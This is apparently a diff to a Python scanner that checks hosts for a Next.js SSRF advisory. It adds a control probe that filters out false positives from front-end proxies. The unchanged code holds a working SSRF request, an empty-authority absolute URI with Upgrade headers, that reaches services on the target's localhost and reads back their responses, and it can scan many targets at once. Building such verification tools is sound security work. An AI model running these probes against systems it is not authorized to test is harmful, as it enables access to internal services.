@@ -30,6 +30,13 @@ upgrade socket:
                                                 strips Upgrade
   - Anything else                            -> INCONCLUSIVE
 
+False-positive guard: a control probe with the same absolute-URI request
+line but NO Upgrade headers is sent first. If the front-end (nginx/Apache/
+CDN) returns the same response to both probes, it is short-circuiting the
+malformed request line on its own — the SSRF never reached Next — and the
+verdict is downgraded to `front_end_intercepts`. Disable with
+--no-control-probe.
+
 Usage:
   python3 verify_ghsa_c4j6.py --target https://app1.example.com
   python3 verify_ghsa_c4j6.py --targets-file targets.txt --json
@@ -111,6 +118,22 @@ def build_payload(absolute_uri: str, target_host_header: str) -> bytes:
     return "\r\n".join(lines).encode("latin-1")
 
 
+def build_control_payload(absolute_uri: str, target_host_header: str) -> bytes:
+    """Same absolute-URI request line as the SSRF probe, but with no Upgrade
+    headers. Used to detect front-end proxies (nginx/Apache/etc) that reject
+    the request line themselves — those return identical errors with or
+    without the upgrade headers, which would otherwise produce a false
+    positive on the `HTTP/1.x` / `Internal Server Error` heuristics."""
+    lines = [
+        f"GET {absolute_uri} HTTP/1.1",
+        f"Host: {target_host_header}",
+        "Connection: close",
+        "",
+        "",
+    ]
+    return "\r\n".join(lines).encode("latin-1")
+
+
 def parse_target(url: str) -> tuple[str, int, bool]:
     if "://" not in url:
         url = "http://" + url
@@ -185,16 +208,54 @@ async def _open_via_proxy(
     return reader, writer
 
 
-def classify(snippet: str) -> tuple[str, bool, dict]:
+def _first_line(snippet: str) -> str:
+    return snippet.split("\r\n", 1)[0] if snippet else ""
+
+
+def _responses_match(probe: str, control: str) -> bool:
+    """Heuristic: probe response looks like the control (no-upgrade) response,
+    meaning the front-end short-circuited the request regardless of Upgrade
+    headers. We compare the status line and total length within a tolerance
+    so dynamic content like `Date:` doesn't cause false negatives."""
+    if not probe or not control:
+        return False
+    if _first_line(probe) != _first_line(control):
+        return False
+    a, b = len(probe), len(control)
+    return abs(a - b) <= max(50, int(0.10 * max(a, b)))
+
+
+def classify(snippet: str, control_snippet: str | None = None) -> tuple[str, bool, dict]:
     """Map the raw bytes of the socket reply to (verdict, impact_confirmed, extras).
 
     impact_confirmed is True iff the response shows that the proxied upgrade
     actually reached a service on the target's localhost:80/443 and read
     something back — i.e. real data exfiltration through the SSRF gadget.
+
+    When `control_snippet` is provided (response to the same request line
+    with `Connection: close` and no Upgrade headers), a front-end-proxy
+    short-circuit guard runs: if both responses look identical, the host's
+    own front-end is rejecting/handling the request line itself and the
+    SSRF never fired — verdict downgrades to `front_end_intercepts`.
     """
     extras: dict = {}
     if not snippet:
         return "likely_patched", False, extras
+
+    if control_snippet is not None and _responses_match(snippet, control_snippet):
+        # Front-end (nginx/Apache/CDN/etc) responded identically to the
+        # control probe — the upgrade-driven SSRF path is not what we saw.
+        if snippet.startswith("HTTP/1."):
+            m = HTTP_STATUS_RE.match(snippet)
+            if m:
+                extras["front_end_status"] = int(m.group(1))
+            for line in snippet.split("\r\n")[1:15]:
+                low = line.lower()
+                if low.startswith("server:"):
+                    extras["front_end_server"] = line.split(":", 1)[1].strip()
+                    break
+        return "front_end_intercepts", False, extras
+
     if snippet.startswith("HTTP/1."):
         m = HTTP_STATUS_RE.match(snippet)
         if m:
@@ -212,32 +273,19 @@ def classify(snippet: str) -> tuple[str, bool, dict]:
     return "inconclusive", False, extras
 
 
-async def probe_one(
-    target: str,
-    probe_path: str,
+async def _send_payload(
+    host: str,
+    port: int,
+    is_tls: bool,
+    payload: bytes,
     timeout: float,
     verify_tls: bool,
-    proxy_info: tuple | None = None,
-) -> dict:
-    token = secrets.token_hex(8)
-    try:
-        host, port, is_tls = parse_target(target)
-    except ValueError as e:
-        return {"target": target, "probe_path": probe_path, "token": token,
-                "status": "invalid", "verdict": "error",
-                "impact_confirmed": False, "error": str(e)}
-
-    host_header = host if port in (80, 443) else f"{host}:{port}"
-    # Use an empty-authority absolute URI ("http:///<path>"). After Next's
-    # normalizeRepeatedSlashes collapses the //, the parsed URL becomes
-    # "http:/<path>"; http-proxy then dials localhost:80 with the request
-    # path = "/<path>" verbatim — which is what we actually want to probe.
-    # An earlier "http://canary.invalid/<path>" form caused every probe to
-    # hit "/canary.invalid/<path>" on the target's localhost service,
-    # producing only false-positive 404s.
-    absolute_uri = "http:///" + probe_path.lstrip("/")
-    payload = build_payload(absolute_uri, host_header)
-
+    proxy_info: tuple | None,
+) -> tuple[str, str | None]:
+    """Open a (TLS / proxied) socket, send `payload`, read until close.
+    Returns (snippet, error). Snippet is the bytes decoded as latin-1 (so
+    binary stays intact). On any connect/send error, error is set and
+    snippet is empty."""
     ssl_ctx: ssl.SSLContext | None = None
     if is_tls:
         ssl_ctx = ssl.create_default_context()
@@ -260,15 +308,11 @@ async def probe_one(
                 asyncio.open_connection(host, port), timeout=timeout
             )
     except (asyncio.TimeoutError, OSError, ssl.SSLError, RuntimeError) as e:
-        return {"target": target, "probe_path": probe_path, "token": token,
-                "status": "connect_error", "verdict": "error",
-                "impact_confirmed": False, "error": str(e)}
+        return "", str(e)
 
     try:
         writer.write(payload)
         await writer.drain()
-        # read until close (or timeout) — caps so we don't grow unbounded on
-        # a chatty upstream
         data = b""
         try:
             while len(data) < 8192:
@@ -278,29 +322,94 @@ async def probe_one(
                 data += chunk
         except asyncio.TimeoutError:
             pass
-        snippet = data.decode("latin-1", "replace")
-        verdict, impact_confirmed, extras = classify(snippet)
-        result = {
-            "target": target,
-            "probe_path": probe_path,
-            "token": token,
-            "status": "sent",
-            "verdict": verdict,
-            "impact_confirmed": impact_confirmed,
-            "response_snippet": snippet[:500].replace("\r", " ").replace("\n", " "),
-        }
-        result.update(extras)
-        return result
+        return data.decode("latin-1", "replace"), None
     except OSError as e:
-        return {"target": target, "probe_path": probe_path, "token": token,
-                "status": "send_error", "verdict": "error",
-                "impact_confirmed": False, "error": str(e)}
+        return "", str(e)
     finally:
         try:
             writer.close()
             await writer.wait_closed()
         except Exception:
             pass
+
+
+async def control_probe(
+    target: str,
+    probe_path: str,
+    timeout: float,
+    verify_tls: bool,
+    proxy_info: tuple | None = None,
+) -> str | None:
+    """Send the same absolute-URI request line as the SSRF probe but with no
+    Upgrade headers. Returns the response snippet (may be empty), or None if
+    the connection failed entirely. Used as a control to detect front-end
+    proxies that short-circuit absolute-URI requests with a generic error
+    regardless of Upgrade — that would otherwise look like a vulnerable
+    target."""
+    try:
+        host, port, is_tls = parse_target(target)
+    except ValueError:
+        return None
+    host_header = host if port in (80, 443) else f"{host}:{port}"
+    absolute_uri = "http:///" + probe_path.lstrip("/")
+    payload = build_control_payload(absolute_uri, host_header)
+    snippet, err = await _send_payload(
+        host, port, is_tls, payload, timeout, verify_tls, proxy_info
+    )
+    if err is not None and not snippet:
+        return None
+    return snippet
+
+
+async def probe_one(
+    target: str,
+    probe_path: str,
+    timeout: float,
+    verify_tls: bool,
+    proxy_info: tuple | None = None,
+    control_snippet: str | None = None,
+) -> dict:
+    token = secrets.token_hex(8)
+    try:
+        host, port, is_tls = parse_target(target)
+    except ValueError as e:
+        return {"target": target, "probe_path": probe_path, "token": token,
+                "status": "invalid", "verdict": "error",
+                "impact_confirmed": False, "error": str(e)}
+
+    host_header = host if port in (80, 443) else f"{host}:{port}"
+    # Use an empty-authority absolute URI ("http:///<path>"). After Next's
+    # normalizeRepeatedSlashes collapses the //, the parsed URL becomes
+    # "http:/<path>"; http-proxy then dials localhost:80 with the request
+    # path = "/<path>" verbatim — which is what we actually want to probe.
+    # An earlier "http://canary.invalid/<path>" form caused every probe to
+    # hit "/canary.invalid/<path>" on the target's localhost service,
+    # producing only false-positive 404s.
+    absolute_uri = "http:///" + probe_path.lstrip("/")
+    payload = build_payload(absolute_uri, host_header)
+
+    snippet, err = await _send_payload(
+        host, port, is_tls, payload, timeout, verify_tls, proxy_info
+    )
+    if err is not None and not snippet:
+        return {"target": target, "probe_path": probe_path, "token": token,
+                "status": "connect_error", "verdict": "error",
+                "impact_confirmed": False, "error": err}
+
+    verdict, impact_confirmed, extras = classify(snippet, control_snippet)
+    result = {
+        "target": target,
+        "probe_path": probe_path,
+        "token": token,
+        "status": "sent",
+        "verdict": verdict,
+        "impact_confirmed": impact_confirmed,
+        "response_snippet": snippet[:500].replace("\r", " ").replace("\n", " "),
+    }
+    if control_snippet is not None:
+        result["control_used"] = True
+    result.update(extras)
+    return result
 
 
 def _response_signature(result: dict) -> tuple:
@@ -312,30 +421,47 @@ def _response_signature(result: dict) -> tuple:
 
 
 async def run(targets, paths, concurrency, timeout, verify_tls,
-              proxy_info=None, differential=False):
+              proxy_info=None, differential=False, use_control=True):
     """Run probes. When `differential` is True, an extra random-path probe
     is sent per target first; subsequent probes get a `differential` field
-    indicating whether their response diverges from that baseline."""
+    indicating whether their response diverges from that baseline.
+
+    When `use_control` is True, an extra no-Upgrade control probe is sent
+    per target; the response is fed into `classify()` so that front-end
+    proxies which return identical errors for both probes get reclassified
+    as `front_end_intercepts` (no false-positive on `HTTP/1.x` / "Internal
+    Server Error" emitted by the front-end itself)."""
     sem = asyncio.Semaphore(concurrency)
 
-    async def bound(t, p):
+    async def bound(t, p, ctrl=None):
         async with sem:
-            return await probe_one(t, p, timeout, verify_tls, proxy_info)
+            return await probe_one(t, p, timeout, verify_tls, proxy_info, ctrl)
+
+    async def control_for(t, p):
+        if not use_control:
+            return None
+        async with sem:
+            return await control_probe(t, p, timeout, verify_tls, proxy_info)
 
     if not differential:
-        tasks = [bound(t, p) for t in targets for p in paths]
+        # One control per target, reused for every (target, path) probe of
+        # that target. Path doesn't materially change control behavior for
+        # front-end short-circuits, and reusing keeps socket budget low.
+        controls = {t: await control_for(t, paths[0]) for t in targets}
+        tasks = [bound(t, p, controls.get(t)) for t in targets for p in paths]
         return await asyncio.gather(*tasks)
 
     # Differential mode: one baseline per target, then the scan paths.
     out: list[dict] = []
     for target in targets:
         baseline_path = "/" + secrets.token_hex(8) + "-nonexistent"
-        baseline = await bound(target, baseline_path)
+        ctrl = await control_for(target, baseline_path)
+        baseline = await bound(target, baseline_path, ctrl)
         baseline["is_baseline"] = True
         baseline_sig = _response_signature(baseline)
         out.append(baseline)
 
-        scan_tasks = [bound(target, p) for p in paths]
+        scan_tasks = [bound(target, p, ctrl) for p in paths]
         scan_results = await asyncio.gather(*scan_tasks)
         for r in scan_results:
             r["differential"] = (_response_signature(r) != baseline_sig)
@@ -371,6 +497,7 @@ VERDICT_GLYPH = {
     "vulnerable": "VULN",
     "vulnerable_proxy_succeeded": "VULN+",
     "likely_patched": "OK?",
+    "front_end_intercepts": "FE",
     "inconclusive": "????",
     "error": "ERR",
 }
@@ -400,6 +527,14 @@ def main() -> int:
                    help="In --scan mode, disable the baseline differential "
                         "filter (report every probe that reached a service, "
                         "even uniform 404s). On by default in --scan.")
+    p.add_argument("--no-control-probe", action="store_true",
+                   help="Disable the front-end short-circuit guard. By "
+                        "default an extra no-Upgrade request is sent per "
+                        "target; if the front-end returns the same response "
+                        "to both, the verdict is downgraded to "
+                        "front_end_intercepts to prevent false positives "
+                        "from nginx/Apache/CDN edges that reject the "
+                        "absolute-URI request line themselves.")
     p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
     p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
     p.add_argument("--insecure", action="store_true",
@@ -437,9 +572,11 @@ def main() -> int:
             p.error(str(e))
 
     differential = scan_mode and not args.no_differential
+    use_control = not args.no_control_probe
     results = asyncio.run(
         run(targets, paths, args.concurrency, args.timeout,
-            not args.insecure, proxy_info, differential=differential)
+            not args.insecure, proxy_info,
+            differential=differential, use_control=use_control)
     )
 
     if args.json:
@@ -479,6 +616,10 @@ def _print_single(r: dict) -> None:
         line += f"  upstream={r['upstream_status']}"
     if r.get("upstream_server"):
         line += f" ({r['upstream_server']!r})"
+    if r.get("front_end_status"):
+        line += f"  front_end={r['front_end_status']}"
+        if r.get("front_end_server"):
+            line += f" ({r['front_end_server']!r})"
     if "error" in r:
         line += f"  error={r['error']}"
     print(line)
@@ -486,6 +627,9 @@ def _print_single(r: dict) -> None:
         print(f"        snippet: {r['response_snippet'][:200]!r}")
     elif r.get("response_snippet") and r["verdict"] == "vulnerable":
         print(f"        snippet: {r['response_snippet'][:80]!r}")
+    elif r["verdict"] == "front_end_intercepts":
+        print(f"        note: front-end returned identical responses with "
+              f"and without Upgrade headers — SSRF probe blocked / unreachable")
 
 
 def _print_scan(results: list[dict]) -> None:
@@ -500,6 +644,19 @@ def _print_scan(results: list[dict]) -> None:
         any_vuln = any(r["verdict"].startswith("vulnerable") for r in scan_rows)
         any_impact = any(r.get("impact_confirmed") for r in scan_rows)
         diff_mode = baseline is not None
+
+        # If the baseline itself was intercepted by a front-end proxy, the
+        # whole scan is meaningless — every "hit" is just the proxy echoing
+        # its generic error. Skip the noisy per-path detail.
+        if baseline and baseline.get("verdict") == "front_end_intercepts":
+            fe_s = baseline.get("front_end_status", "-")
+            fe_srv = baseline.get("front_end_server", "?")
+            print(f"  front-end proxy intercepted both probes "
+                  f"(status={fe_s} server={fe_srv!r})")
+            print("  SSRF probe never reached Next — try direct against the "
+                  "Next process if you can, or use --no-control-probe to see "
+                  "the raw verdicts.")
+            continue
 
         if not any_vuln:
             print("  (not vulnerable / no signal — skipping detail)")
